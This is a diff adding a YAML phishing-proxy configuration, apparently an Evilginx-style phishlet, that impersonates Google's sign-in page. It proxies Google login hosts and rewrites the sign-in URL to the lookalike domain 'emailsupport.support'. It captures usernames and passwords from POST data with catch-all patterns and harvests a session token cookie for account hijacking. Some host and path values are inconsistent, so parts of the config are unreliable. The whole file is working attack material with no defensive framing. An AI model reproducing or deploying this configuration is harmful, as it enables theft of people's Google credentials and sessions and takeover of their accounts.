@@ -1,0 +1,26 @@
+author: '@ringx'
+min_ver: '2.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'google.com', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'google.com', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'accounts.google.com', orig_sub: 'login', domain: 'google.com', 
+    search: 'https://accounts.google/v3/signin', replace: 'https://emailsupport.support/v3/signin', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+auth_tokens:
+  - domain: 'login.gmail.com'
+    keys: ['session_token']
+credentials:
+  username:
+    key: 'username'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+auth_urls:
+  - '/dashboard.php'
+login:
+  domain: 'accounts.google.com'
+  path: '/v3/signin'
